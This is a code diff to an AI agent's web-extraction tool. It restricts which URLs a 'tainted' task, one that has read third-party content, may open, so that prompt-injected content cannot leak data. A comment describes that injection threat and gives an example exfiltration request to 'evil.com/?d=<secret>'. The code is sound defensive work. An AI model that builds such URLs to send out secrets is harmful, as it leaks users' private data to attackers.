@@ -21,6 +21,7 @@ from pydantic import BaseModel, Field
 
 from mavis.config import get_settings
 from mavis.domain.policy import Capability, RiskClass
+from mavis.domain.tasks import TaskOrigin
 from mavis.tools.registry import MavisTool, current_run, current_task_id
 
 log = structlog.get_logger()
@@ -282,9 +283,11 @@ async def extract(url: str, max_chars: int = _MAX_PAGE_CHARS) -> str:
 
 # --- web_extract inside tainted tasks ----------------------------------------------------------------
 # A tainted task has read third-party content, which may try to send data out in a URL it makes up (an
-# exfiltration GET: evil.com/?d=<secret>, a Google Form submit URL, ...). There, only exact URLs the user
-# gave (verbatim in the root goal) or that this task's own web_search returned may be opened. Search
-# result URLs come from the search engine and cannot carry live user data.
+# exfiltration GET: evil.com/?d=<secret>, a Google Form submit URL, ...). There, only URLs this task's own
+# web_search returned may be opened, plus exact URLs in the root goal when that goal came from the user in
+# an untainted turn (origin USER, root not tainted). A goal written by the initiative reasoner or in a
+# tainted turn is model text that may carry injected links, so its URLs are never trusted. Search result
+# URLs come from the search engine and cannot carry live user data.
 
 _URL_IN_TEXT = re.compile(r"https?://[^\s<>\"']+", re.I)
 _BARE_HOST = re.compile(
@@ -346,7 +349,9 @@ async def _tainted_task_urls() -> set[str] | None:
             break
         task = parent
         allowed |= _search_urls.get(task.id, set())
-    return allowed | urls_in_goal(task.goal)
+    if task.origin == TaskOrigin.USER and not task.tainted:
+        allowed |= urls_in_goal(task.goal)
+    return allowed
 
 
 async def web_extract(user_id: int, args: ExtractArgs) -> str:
